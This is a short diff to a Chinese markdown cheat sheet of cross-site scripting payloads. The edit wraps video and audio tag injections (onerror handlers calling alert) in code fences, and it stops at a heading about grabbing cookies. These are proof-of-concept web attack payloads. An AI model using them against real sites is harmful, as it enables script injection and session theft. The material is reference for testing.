@@ -481,11 +481,14 @@ http://drops.wooyun.org/tips/147
 ```
 
 【video标签】 
+```
 <video><source onerror="alert(1)"> 
 <video src=x onerror=alert(48)>
+```
 【audio标签】 
+```
 <audio src=x onerror=alert(47)>
-
+```
 
 ### 拿cookie
 ```
